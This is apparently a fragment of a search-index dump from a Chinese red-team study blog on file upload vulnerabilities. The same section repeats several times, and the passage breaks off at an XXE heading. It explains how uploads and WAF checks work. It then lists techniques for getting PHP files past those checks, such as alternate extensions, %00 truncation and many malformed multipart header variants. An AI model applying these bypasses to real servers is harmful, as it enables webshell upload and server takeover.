fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#内容重复"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#数据溢出"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#数据截断"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#8利用sessionupload_progress"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#条件"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#使用方法"},{"categories":["hvv"],"content":"\r06-XXEXXE xml外部实体注入 